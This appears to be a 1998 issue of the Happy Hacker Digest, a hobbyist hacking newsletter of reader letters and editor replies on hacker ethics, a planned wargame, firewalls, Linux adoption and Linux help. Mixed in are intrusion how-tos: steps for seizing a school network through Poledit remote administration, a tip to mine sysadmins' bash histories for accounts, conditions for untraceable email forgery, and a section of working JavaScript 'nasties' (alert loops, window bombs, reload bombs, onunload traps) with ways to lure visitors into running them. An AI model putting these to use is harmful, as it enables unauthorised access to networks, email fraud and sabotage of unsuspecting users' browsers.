@@ -1,0 +1,816 @@
+Feb.11, 1998
+
+ 
+
+===================================================================
+URL of the day: http://www.geocities.com/SiliconValley/Pines/2857/
+See back issues of the Happy Hacker Digest and Guides to (mostly) Harmless
+Hacking at http://techbroker.com/happyhacker.html.
+GTMHH en espanol: http://underhack.islatortuga.com
+Super Swedish Happy Hacker site (in English):
+http://w1.340.telia.com/~u34002171/hhd.html;(in Swedish):
+http://w1.340.telia.com/~u34002171/hhd/gtmhh/svenska/gtmbegsvensk1.txt
+We are AGAINST computer crime. Don't tell us anything you wouldn't tell
+your friendly neighborhood narc!
+===================================================================
+Table of Contents:
+* Calling all hackers: multinode freenet
+* Poledit hacking
+* Firewalls
+* Free Software News
+* New punctuation rule!
+* More whois help
+* Forging perfect email
+* The trouble with bash histories 
+* Win 95 stuff
+* Open VMS question
+* Looking for crack dictionary en espanol 
+* Linux questions
+* Looking for mentor
+* Javascript/HTML nasties
+
+* Jobs for security experts
+====================================================================
+*** Calling All Hackers: Multinode Freenet
+====================================================================
+From: Bernz
+
+Mr. Un4scene's passionate (if I might call it that) letter struck a chord in
+me. I am also 20, largely self-taught and have the same amount of skills
+that he does. I am also highly annoyed at the bragging and the
+elitism of the current hacking community. Some consider me "elite" some
+do not. It shouldn't even be addressed. Not a single person is born with
+any sort of knowledge. -THAT- is the incredible beauty of the computer
+community in general. A basic imbecile like me can work and study and
+achieve a goal. Looks do not count (but I look just like Brad Pitt. no,
+really, I do ;) and backgrounds and the like do not matter at all. It's
+one's attitude, desires and basic willingness to learn that I loved about
+the hacker community. The point of hacking (at least back in "the day") was
+simply to learn. And I and Un4Scene have done that. We (and not to toot our
+own horns) are good examples of just where the hacker ethic can get someone
+if utilized properly.
+
+You can write a script that does a DOS (denial of service) and call yourself
+a hacker; but likewise you can "create great works of art and beauty" on a
+system and call yourself a hacker as well. That's the kind of hacker I wish
+was in this world more.
+
+To that end, I have constructed a multi-node freenet. This is a call to
+everyone who wants to participate CONSTRUCTIVELY to the hacker community
+in general. This system is devoted to the wonderful creativity with
+numbers and images and the like that hackers seem to posses. If that
+sounds like you, if you want to learn and do it right, feel free to sign
+up on the website.
+
+I hope that new hackers get off on the right foot. If I can give back what I
+have taken from the hacker community, I'm a happier boychick.
+
+later.
+
+_________
+BERNZTECH
+David Bernick
+System Administrator, Owner
+www.bernztech.ml.org
+
+====================================================================
+*** Hacker Wargame Update
+====================================================================
+We have loans of an Indigo running Irix 6.2, a Sun SPARC 1 running SunLinux,
+a Symbolics box, and a 80486 running Linux 1.3 for the upcoming Hacker
+Wargame. We are testing them out now, making sure they have lots of
+wonderful holes still left in them so you can break in, but closing denial
+of service vulnerabilities. Next step: put them on a T1!
+
+Please give us feedback on the rules you think we should follow. Right now
+we think a good set of rules are:
+
+1) Start with a known insecure system that can easily be broken into from
+the outside. Keep it insecure for a month so all the newbies can have fun
+breaking in.
+
+2) No credit for denial of service attacks.
+
+3) After the first month, anyone who gets root would be permitted to secure
+the system so others can't break in.
+
+4) We would, however, require that the Indigo be left running services and
+software comparable to what a commercial Internet Service Provider would
+offer. We will also require that remote syslog and TCP Wrapper remain
+enabled and no editing of the log files.
+
+5) Anyone who gets root wins a free shell account.
+
+6) Whoever is root should not delete any user accounts.
+
+7) We would help cover the cost of the T1 by selling shell accounts on this
+computer for $10 per month. If you can figure out how to use your shell
+account to get root (it is easier than breaking in from the outside), then
+your account becomes free.
+
+8) Use of the Hacker Wargame computers to commit crimes will be strictly
+verboten. Since some FBI dudes may be playing the game, it would be
+suicidal to try to run a crime rampage off the Hacker Wargame computers.
+
+9) All logins must be through secure sockets layer or secure shell.
+
+10) We would pipe the syslog file to both a Web site and an ftp server so
+anyone may evaluate the techniques being used to both break into and secure
+the system.
+
+11) We will allow whoever is root to post his or her boasts to a Web site on
+the Indigo. Root should leave previous boasts on the Web server.
+
+12) As the game begins, several members of the dread 505 gang will hide root
+kits and other goodies on these systems. Run a port scanner and see if you
+can find a 31337 way to get in. However, watch out, they may play some
+jokes on you.
+
+13) How would we enforce these rules? We have the boot disk and the dread
+K-rad elite 505 gang running the game, muhahaha!
+
+====================================================================
+*** Poledit Hacking
+====================================================================
+
+From: Ked Shayer
+
+Hi, I just though I'd do another method of hacking most school(any state 
+or small private school with a 1 or 2 room network) networks. Most of 
+them run Poledit(at least they do here in the UK...) So, here goes. Get 
+Poledit on a disk. Open it up and edit the registry, get your user/group and
+enable the passwords control panel, enable remote administration. Remote
+admin through Poledit to the server machine. Edit the config.pol to add a
+user with full access(say admin666). Then, if there are any other things you
+need to kill work on them. End any NSM client tasks FIRST! You will then
+have approx. 1 min before the person in your server will notice, if they are
+on the comp... Work fast
+
+PS: What is IRIX
+PPS: www.be.com
+PPPS: www.mirrorworlds.com
+PPPPS: wow! pses are cool.
+P.PPP.PPP.PPP.S(a rythmn!)
+
+Okay, I'm gonna shut up now, have a nice browse
+
+[Carolyn: Irix is a System V Unix that runs on Silicon Graphics machines. It
+is best in the world for graphics, great for pumping bits in
+telecommunications sessions, but poor at handling lots of user accounts.]
+=======================================================================
+*** Firewalls
+=======================================================================
+From: Modify
+
+&gt>From: Bob Jonanson
+&gt>&gt>What do you think is the best firewall out there??
+&gt>&gt>[Carolyn -- Depends on what you use it for. An ISP needs a different one
+&gt>from a big company. TCP wrappers with secure sockets layer is good for an
+&gt>ISP, with Kerberos and no rhosts stuff for the internal LAN. But that's just
+&gt>my opinion.]
+
+[Your opinion sucks and shows that you lack knowledge of firewalls. TCP
+wrappers are not firewalls!!! An ISP needs a different one from a big
+company??? What the hell does that have to do with anything... I am
+partial to FW-1, IBM SNG, Raptor, Gauntlet, and if you don't have the
+money just use a packet filtering router because remember firewalls are
+a concept!!! Nothing you stated above has anything to do with a
+firewall except maybe encryption!]
+
+Modify
+
+[Carolyn: Funny, lots of other people think TCP Wrappers are an essential
+element of a good firewall. For example, see the book "Maximum Security"
+published by Sams.net and available in Barnes and Noble bookstores or at
+their Web site. This book includes a CD-ROM with scanners and exploits --
+perfect for the intermediate hacker.
+To be more specific, TCP Wrappers can keep logs of the goings on between
+your computer and the outside world, but do not halt access to attackers
+like a firewall. Some sort of logging utility such as TCP wrappers should
+be a part of any firewall. Look at TCP wrappers as a burglar alarm.
+--------------------------------------------------------
+From: JAY BAYLON
+
+I have been reading GTmHH for some time now. I'm not a hacker nor am I a
+cracker but I do know my computers (maybe someday *grin*). What I really
+like to hear is some in-depth explanation on how firewalls work and how to
+trick them. I'm using a computer which passes through the corporate
+firewall. I can use http but I can't use ftp. The "other" PC's which uses
+windows 95 use a proxy client which I don't have the luxury of using since
+I'm using a Sun Solaris 2.5 x86. I have search the web for ftp proxy
+clients and been fortunate enough to find codes. Unfortunately I'm having
+trouble compiling them.
+
+Can you please help me. Most of the cool wares that I want downloaded uses
+ftp downloads not http.
+
+[Carolyn: Believe it or not, there is a free program for Windows 95 called
+"What's Up" at http://www.ipswitch.com which will get you lots of
+information on computers inside firewalls. Tip to sysadmins: turn echo off
+on any box you don't want What's Up to see through your firewall.]
+
+======================================================================
+*** Free Software News
+======================================================================
+January 22, 1998, Netscape announced it would distribute source code for its
+browsers and allow anyone to develop freeware from it. According to Tasty
+Bits from the Technology Front:
+
+Wired muses [9] on the grand experiment in "freed software" on
+which Netscape embarked last week [10]. It's an open question
+whether Netscape can engage developers enough to halt Navigator's
+slide in the browser standings, let alone whether the company will
+be successful in "herding the cats" on such a scale. ...In fact
+Netscape has requested the counsel of Eric S. Raymond, author of the influential 
+paper The Cathedral and the
+Bazaar [11], on licensing terms, development models, developer re-
+lations, and so on. (Raymond hints that he has been asked to meet
+with other Silicon Valley CEOs on the same trip.)
+
+[9] http://www.wired.com/news/news/technology/story/9966.html
+[10] http://www.tbtf.com/archive/01-29-98.html#s03
+[11] http://www.ccil.org/~esr/writings/cathedral.html
+-------------------------------------
+How many hackers are there? If running Linux is a good marker of being a
+hacker, then there are at least several million of us. According to an
+article from Tasty Bits from the Technology Front (TBTF),
+
+The free software phenomenon is big and growing fast. It's inher-
+ently difficult to estimate the size of the Linux market because
+there is no central body controlling its distribution, and because
+the software is available for free download from numerous sites
+around the world.
+
+First some recent numbers on the commercial competition. A new IDC
+study [12] indicates that Windows NT shipments outpaced commercial
+Unix in 1997. Windows NT grew at 78% year-on-year, while Unix grew
+at 15%. The numbers below presumably refer to installations of NT
+Server, though the news.com article does not make a distinction
+with NT Workstation.
+
+OS thousands
+
+NT Server 1300
+NetWare 900
+Comm'l. Unix 717
+OS/2 226
+
+In a SunWorld Online article [13] on Linux support by Red Hat, one
+of the Linux resellers, an IDG analyst estimated 1997 Linux instal-
+lations at 2 to 6 million, putting Linux on a par with the Macintosh:
+
+OS millions
+
+NT Workstation 7+
+Linux 2 - 6
+MacOS 3.8
+OS/2 1.2
+
+(Another SunWorld article profiles Linux use in the business world
+[14]. Note especially the sidebar case study of a system administra-
+tor who runs 72 print stations worldwide on Linux.)
+
+An often-quoted source of Linux numbers is a year-old white paper
+[15] by Bob Young, CEO of Red Hat. Young notes surveys by Unix maga-
+zines that point to anywhere from 10% to 34% of their readers using
+Linux. Here are Young's estimates of the number of Linux systems
+extant through 1996:
+
+End of
+year millions
+
+1993 0.1
+1994 0.5
+1995 1.5
+1996 3 - 5
+
+In the SunWorld Online piece [13] Red Hat's PR director estimates
+that in 1997 there were between 5 and 7 million Linux systems
+operating.
+
+Let's work our way to a new estimate of the 1997 Linux population by
+other means. At a talk last week by Red Hat staffers at Softpro [16],
+Donnie Barnes estimated that 400K Red Hat CDs will be sold in 1998.
+In another context he mentioned that each major release has sold
+roughly twice as many copies as its predecessor. Taken together
+these factoids lead to a rough guess of 200K CDs sold in 1997. Fig-
+ures from Softpro indicate that for 1997 the sales of all other
+Linux CDs combined added up to about 25% of Red Hat sales. Softpro
+doesn't carry all the avaliable CDs; in particular some brands that
+are big sellers in Europe are not represented. So let us hazard an
+estimate of 300K Linux CDs sold worldwide in 1997.
+
+FTP downloads outnumber Linux CD sales, according to an ongoing
+survey at the Linux Counter [17] site. These data stretch back to
+1994 and so obscure the increasing popularity of the Linux CD pro-
+ducts. If we assume that FTP downloads outnumbered CD sales by 3
+to 1 in 1997, we arrive at about 1.2 million Linux media kits. CDs
+typically get used for more than one installation, either by the
+purchaser or by someone she passes it to (there being no restric-
+tion on multiple use, of course). In the extreme case a system
+administrator might install scores of Linux machines from a single
+CD or FTP download [14]. If we assume the multiple-use multiplier
+is 5 or more, we're in the realm of Red Hat's estimate of 5 to 7
+million total Linux systems in 1997.
+
+[12] http://www.news.com/News/Item/Textonly/0%2C25%2C18542%2C00.html?pfv
+[13] http://www.sun.com/sunworldonline/swol-01-1998/swol-01-eyeoncomp.html#2
+[14] http://www.sun.com/sunworldonline/swol-01-1998/swol-01-linux.html
+[15] http://www.redhat.com/redhat/linuxmarket.html
+[16] http://www.tbtf.com/archive/01-12-98.html#s07
+[17] http://counter.li.org/reports/machines.html
+________________
+TBTF home and archive at http://www.tbtf.com. To subscribe
+send the message "subscribe" to tbtf-request@world.std.com. TBTF
+is © 1994-1998 by Keith Dawson, dawson@world.std.com.
+---------------------------
+From: Kenn Evitt
+
+>A true hacker enjoys exploring and working things out- programming is one of
+>the best ways to do this. Why not give away the fruits of your fun? Some
+>would say that being paid for it is selfish- although I doubt many people of
+>the cracker mentality would understand that: a typical cracker would, I
+>agree, like to take- breaking into a system, pirating "warez" and the like,
+>but not give. After all- where, they would say, is the gain in that?
+>
+>- Strider
+
+Civilization is the process of setting men free. Men do the work they
+love and trade it by mutual agreement to mutual benefit so that both may
+pursue their own productive avenues. Money is merely a tool to
+facilitate that process. Being paid for anything IS selfish, and I think
+that a rational selfishness is a virtue not a vice. I will not work for
+free, because I value my life, and my time. I am proud of the products
+of my efforts. But you've damned yourself, you're selfish too. If their
+were no people, no community of intelligent, productive people willing
+to make something to mutual benefit (like Linux), then you're all
+selfish too. But is this bad? Is this evil? Think about it.
+
+======================================================================
+*** Grammar Debate
+======================================================================
+
+Cerenyx the Dark One
+
+&gtCarolyn, if you want to end a sentence with a period, by all means.
+&gtHowever, take note that your periods take place INSIDE the quotes.
+&gtExample: for example "pico myfilename."
+the period appearing inside the quotes? This may and could
+the newbies. If you put them outside the quotes like this: for
+"pico myfilename". It will clear up a lot of misunderstanding.
+
+[Carolyn: Good idea. Given the flames and anguish caused by the punctuation
+in that GTMHH, I now realize how confusing proper English punctuation can be
+for many hackers. In the English language, proper grammar requires that
+commas and periods go inside the quotation marks, while colons and
+semicolons go outside. Following your suggestion will also save enormous
+quantities of Internet bandwidth by ending all the transmission of flames
+about whether to follow English punctuation rules or use hacker punctuation
+rules:)
+
+P.S. If grammar mavens launch a flame war over my abandonment of proper
+punctuation rules, I may just quit using periods entirely*]
+===================================================================
+*** More Whois Help
+===================================================================
+From: Un4Scene
+
+>From: Bob Jonanson
+>>I'm getting really into this stuff!
+>>When I do a whois @toad.net it gives me about 250 addresses. How do I 
+>tell it to just display a couple at a time so I can see more than the 
+>last 20?
+
+Another easy way to resolve this problem is to simply enlarge the size
+of your telnet buffer. I will use the standard Windows telnet program
+as an example since that is probably what most people are using. In
+telnet go to the 'Terminal' menu, then go to 'Preferences'. Here, near
+the bottom left corner you will find the buffer size setting. If you
+increase this to, for example, 200 instead of the standard 25 and then
+resize your telnet window to something more suitable, you will then be
+able to just scroll up through your telnet window to view everything you
+missed. Beware though, if you enter a program such as pine or pico, a
+program that requires a standard size window, then when you leave that
+program it will automatically reset your buffer to the standard size. 
+This will not be reflected in your settings though. Just go back to
+your 'preferences' window and press enter again to change it to the
+larger buffer.
+
+======================================================================
+*** Email Forging
+======================================================================
+From: Un4Scene
+
+>FROM C8TO,
+>>Another note on email forging for the absolute newbie:
+>
+I don't believe this to be reliable. I have tested this before and I have
+never seen it done where the dynamic IP of the sender doesn't show, or where
+the message id tag can not be traced back to the original host. 
+I'm not saying it's not possible with this method, I'm simply saying
+that I've never seen it proven to be 100% anonymous.
+
+Regards,
+
+~-_-~Un4Scene~-_-~
+
+[Carolyn: You can do perfect email forging on a computer that runs a version
+of sendmail prior to 8.8 AND does NOT run identd but DOES allow mail
+forwarding. But it may take awhile to find a computer that meets all these
+conditions.]
+
+===================================================================
+*** The Trouble with Bash Histories
+===================================================================
+_ From: Un4Scene
+Miss Meinel,
+I can understand why people are so worried about their bash histories
+being viewed by others. When I first came to work where I am now
+everybody's bash history was world-viewable, including everyone on the
+technical staff's. They had been using their own shell accounts to add
+new users (via sudoers status) instead of root and all the new accounts
+they had added were shown in plain text to anyone who cared to look. 
+This, by the way, is an excellent place for hackers to find other
+peoples accounts. Find out the sys admin's login and check his/her bash
+history. You just may get lucky, if the sys admin uses bash and is not
+careful with permissions then chalk one up for you.
+I believe the easiest way to solve this problem (for a regular user)
+is to change the permissions of the file. Please keep in mind that I am
+using a server running Solaris 2.6 and UNIX SVR4, the means may be a
+little different for Linux users, though the effect is still the same. 
+You can change your permissions to '000' which translates to
+'----------' for your permissions. Not only does this prevent anyone
+without root access from viewing your history, but I believe it prevents
+you from writing to it. Therefore all your problems with it are solved,
+and yes, you can still use the history feature by using the up arrow to
+scroll through your last commands. On my server the command is:
+
+chmod 000 ./.bash_history
+
+Regards,
+~-_-~Un4Scene~-_-~
+
+[Carolyn: That is a great precaution for people to take who find it useful
+to keep a bash history for themselves. In fact, I use bash a lot partly
+because it is so nice to use arrow keys to replay commands I gave earlier.
+By redirecting the bash history to /dev/null, as long as I am logged in, I
+can still replay that session's commands even though they never get written
+to disk. The biggest reason, however, that I use bash is because I am a
+spastic typist.]
+
+=======================================================================
+*** Win95 Stuff
+=======================================================================
+From: Don Hersey
+
+Hey
+
+During a call to tech support I learned of a cool prog that comes with
+win95. go to run and type sysedit
+
+it opens (in ascii form)
+
+autoexec.bat
+config.sys
+win.ini
+system.ini
+protocol.ini
+and
+msmail.ini
+
+you can do some heavy stuff in there.
+
+love gtmhh
+
+Don Hersey
+
+sysadmin for Hersey Associates
+------------------------------------------------
+From: Bruce Conklin
+
+Do you enjoy the process of getting in to Windoze Control Panel; 
+numerous double-clicks and lots of windows left open. Well, there IS 
+a much easier way.
+
+You can add Control Panel to the top of the Start Menu. Then all you 
+have to do is open Start Menu and place your cursor on Control Panel 
+and all the options will appear in a cascading Windoze menu. Here's 
+how:
+
+1. Open Explorer
+
+2. Go to Windows/Start Menu and create NEW folder under Start Menu
+
+3. Use this name EXACTLY:
+
+Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}
+
+I have put the name on a separate line so you can cut and paste it to 
+the new folder icon.
+
+Now you will have a nice pop-out hierarchy for Control Panel at the 
+top of your Start Menu. Have fun.
+================================================================
+*** Open VMS Question
+================================================================
+
+From: Matthew Weigand
+
+I have a minor problem that I wondered if you could,
+(or would;) help me with. The system administrators
+at my school have a policy against mudding, which
+they have held for a few years, since the days when
+computing resources on this campus were scarce. Now,
+computing resources are always open, and they have a
+much larger network here. Well, anyways, they still
+have the same policy.
+Most of the student body has an account on an OpenVMS
+system, and the sysadmin has engineered an antimud
+program that severs the telnet connection to the
+school's OpenVMS system when you use your account to
+telnet to a certain address. At the very least, I'd
+like to know how it works, I'm curious. And at the
+most, I'd like to know if there's a way to trick it. 
+Even if I telnet to a different address, then to the
+taboo address, the sysadmin can tell what I'm doing. 
+What can I do?
+
+==================================================================
+*** Looking for Crack Dictionary en Espanol
+==================================================================
+From: Enzo Carriani
+
+Hi, my name is Enzo. A few days ago, I read an article
+about the Phf hacker method to obtain password file.
+Im very interesting about this, because i've my own
+server and work in it like root too.I get the 2 most
+useful Craker passwd. :John the Ripper and Jack, but
+there are not in the web many SPANISH
+dictionary(files that only contains spanish words).
+So, to test my server, John and Jack doesn't work so
+well with their original dictionaries(for example,
+Puffs.dic).Do u know some web site that offer an
+spanish dic.? Please, help me in this, or "give me a
+hand".
+Thanks...
+
+Enzo
+
+==================================================================
+*** Linux Questions and Answers
+==================================================================
+From: Nezah
+
+Could you recommend a *good* and *friendly* environment for C/C++
+development under Linux (in GNU distribution) and where to get it.
+-----------------------------------
+
+From: Metgod
+>I plan to make a UNIX box out of them. My question is, what type of 
+>Unix do the other readers of the digest prefer, also what kind of cool 
+>apps and utils are there? I'm doing it to learn UNIX better than I 
+>already do (I have some experience using it but not installing and 
+>administrating it). Thanks in advance.
+
+Well, lets see, some really cool UNIX base OS would be Linux, for
+instance Caldera or Red Hat.
+However, I might go for Sun, it's much stronger.
+
+I also thought it pretty funny how people have never heard of a period. 
+Any moron knows that. Even if you don't speak English, which you
+obviously did. I know Spanish, not enough to translate though. Guess
+what? They use periods as well as commas and ?'s.
+
+MetGod
+-----------------------------------
+From: Anthony Lim
+
+There is something I wan to ask about Linux (Slackware 3.0).
+I have some problem with my kernel. I have upgraded my kernel to 2.1.65.
+After I compile my kernel... and after all those make dep, make clean and
+finally make zlilo... It has an error saying that my kernel is too big. And
+prompt me to use make bzImage instead. Ok now after I have compile with make
+bzImage what should I do next?? 
+After that I try to compile my modules by running make modules... it
+runs but with and error "clock srew" and whatever it is. After that I run
+make modules_install , it runs too but with the same error. After that I
+reboot my system.... There is an error message with my modules... it says
+it unable to resolved my xxxxx.o file? Besides that it also stated that it
+could find my modules.dep file. I have read lots of Unix HOWTO
+documentation... but it still couldn't help. So I hope that u can help
+me....... Thank you very much.
+----------------------------------------
+Anonymous:
+
+I recently got red hat's Linux 4.1 for Intel and when I tried to
+install it I found a problem. Linux will install fine but lilo will not
+install onto my machine. I have win95 but that can't be the problem cause
+the last time I tried to install Linux I formatted my HD first and started
+with Linux and it still would not install lilo. the only thing I can think
+of is that I have a bad install CD. red hat tech support gave me the run
+around, answers lilo not loading, which has nothing to do with lilo not
+installing from the install CD. I can't alter a program that doesn't exist
+on my computer yet. and after they gave me the run around till the warranty
+ran out for tech support they cut me from their system. so my only chance is
+if someone out there can help me. I'm not a Linux god as a matter of fact I
+was just learning Linux but I can't get on with my study until I can
+actually use Linux and was gonna use this version to learn from. If anyone
+can help or can confirm my theory that the install CD red hat sent me is faulty
+I would appreciate it, thanks..
+
+: What does lilo (not) do? Does it give an error? Does it not boot?
+I am very hesitant to blame RedHat. Give us some more information about
+your system and we may be able to help. 
+
+more info- when I try to install Linux(it's not on the computer
+yet) Linux appears to install fine but when it comes to installing lilo the
+install program errors. it just tells me there was an error and asks me if I
+want to retry, goto the previous step, or goto the menu(none of which help).
+lilo for some reason refuses to install on the computer, no matter if I
+install it to the master boot record, the hard disk, or a floppy(which are
+the 3 options the install program gives me). lilo just won't install just
+gives me an error.
+The computer is a gateway 2000, 124M ram, 5.1gig hard drive, 3.5" floppy,
+12x CD-ROM, CD recordable ROM, and a 100M zip drive. If any more info about
+the computer is needed ask away. Thanks for your time.
+
+:Do you have 'boot sector virus protection' enabled? Something like LILO
+that writes directly to the boot sector would conk right out if it was.
+
+Ok I'll be showing my lack of knowledge here but how do I tell if 'boot
+sector virus protection' is enabled and if so how do I disable and
+enable(after I'm done installing Linux) it? thanks for your time, it's
+really cool of you to go out of your way like this.
+
+:What maker and model number of BIOS do you have (should say when it first
+starts up.)
+
+when I start the computer it reads:
+AMIBIOS (C)1992 AMERICAN MEGATRENDS, INC.
+BIOS VERSION 1.00.08.CS1T
+
+:And you can disable it. It should say 'Hit <key>to enter Setup' once you
+do that, hunt around until you find a 'Virus Protection' feature. try to
+disable it.
+
+Ok mayhap I'm blind and will kick the crap out of myself for appearing so
+foolish but I can't find any way of disabling any virus protection in my
+BIOS. please help, if I can't install this then I'm screwed, I'm not paying
+any more for a secure version sent to me(I bought this version from RedHat),
+and I don't know if I want to trust any version I could download off the net.
+
+==================================================================
+*** Looking for mentor
+==================================================================
+
+From: Josh Crane
+
+I am in a tight situation, of no-one else's genuine concern, but very
+important to me. I am looking for a person or some people who will
+genuinely take an interest in my development as a hacker to both, gain
+them some self satisfaction, and aid me in resolving my serious problem.
+
+I really don't know who to talk to regarding all of this.. so please
+forgive me if I'm totally out of line and barking up the wrong tree. If
+I am right... I make a very good student.
+
+Kind regards,
+jcrane@bit.net.au
+
+=======================================================================
+***JavaScript/HTML Nasties
+=======================================================================
+You all know I'm not responsible for how you use this info
+
+First thing you would have to do to become nasty is declare some mean
+functions, so here goes.
+I will explain each function, you will recognize my comments by the
+comment tag //
+of course it's in an HTML page so start it off like that
+<HTML><head><title>Blah blah blah</title>
+<script>function alerttrue() //declares a function
+{ //opens a function
+while (true){ //infinite loop
+window.alert("Haha.")//alert box that will keep on coming up
+}//closes function
+}//closes loop or the other way around
+
+function windowbomb()
+{
+var iCounter = 0 //counter var declares a variable
+
+while (true)
+{
+window.open("http://www.netscape.com","CRASHING" +
+width=1,height=1,resizable=yes")
+iCounter++ //keeps on adding one and the loop continues browser
+keeps opening
+}
+}
+
+function password(){
+while (true) { 
+prompt("Enter Password To get out of Loop:")
+}
+}// the key is there is no password it will keep asking them andthey
+will have to shut // down the browser
+
+function reloadbomb()
+{
+history.go(0) // reload this page
+window.setTimeout('ReloadBomb()',1) // tell netscape to hit this
+function
+// every milisecond 
+}
+
+</script>now we can get ready to use these
+so close the head tag like so:
+</head>open up the body
+<body onunload="functionname()">what that did was that it will call the function you specify when they leave, such as my password or any other one
+another onunload that you could have added would look like this
+<body onunload="location=("yourwebpage.html")" >what that does is when they try to leave it will just reload your page, then they have to shut down their browsers and start over because they are forced to stay on you page, you could also send them elsewhere the
+same way, you can also use <body onload="functionname()">
+that function would be called when the page is loaded up
+
+So, how do you get the people to run your nasty functions?
+
+lots of ways, actually.
+
+first you could make a link that goes nowhere and in the tag it would
+look like this
+
+<a href="" onclick="functionname()">add to that tag the onmouseover part like so
+<a href="" onclick="functionname()" onmouseover="window.status='Cool
+Page' ;return true">Cool Page</a>then when they go over it they will see cool page on their status window and the link will say cool page as well, they click, your function is
+ran. you could take the same idea about onmouseover, and forget the onclick
+and do something like this.
+
+<a href="" onmouseover="functionname" ;return true>cool Page</a>
+the second they move their mouse over it the function is ran
+
+You could also use button so they don't see what the file name is or
+anything like that.
+
+Back to the onload= thing
+you could make a mean page that when it loads up it will run one of the
+nasty javascript funtions
+
+Well, hope you liked this
+
+You may know me as MetGod
+someday I might give out my email address.
+
+[Carolyn: I'm printing this so you folks will be inspired to disable Java on
+your browsers. This is a mostly harmless exploit, but there are others that
+are far worse.]
+==================================================================
+*** Jobs for Computer Security Experts
+==================================================================
+Jobs-Jobs-Jobs
+The Security Experts, Inc.
+
+We have several slots for security people here in Florida and 
+around the country. Here are some of the skill sets we need for 
+our increasing project loads:
+
+- Firewalls, Unix NT
+- General Security Audits
+- NW Security Implementation/Audit/Config
+- Penetration Testing/Tools/Scanning
+- Crypto/PKI coders
+- Project Managers
+- AS-400 
+- Security Management
+
+If you have some of these skills are looking for:
+
+- Short term contracts
+- Longer term staffing
+- Full time employment
+
+Please send your resume and financial requirements in total 
+confidence to:
+Winn Schwartau
+COO, The Security Experts, Inc.
+winn@securityexperts.com
+http://www.securityexperts.com
+__________________________________________________________________
+with
+message "subscribe hh." 
+This is a list devoted to *legal* hacking! If you plan yo use any
+information in this Digest or at our Web site to commit crime, go away! Foo
+on you! Happy Hacker is a 501 (c) (3) tax exempt organization in the Unites
+States operating under Shepherd's Fold Ministries. Yes! This is all a plot
+to save your immortal souls!
+For Windows questions, please write Roger Prata; for
+Macs, write Strider; and Unix, Carolyn Meinel. Editor-in-chief is R.J. Gosselin. Webmaster is
+Praying Mantis. 
+___________________________________________________________________
+Carolyn Meinel
+M/B Research -- The Technology Brokers
+http://techbroker.com
+
+"Inside every digital circuit, there's an analog signal screaming to get
+out." -- Al Kovalick, Hewlett-Packard
+
+"Hex, Bugs, Rock Roll" -- Bruce Conklin, Space Dynamics Lab, Utah State U
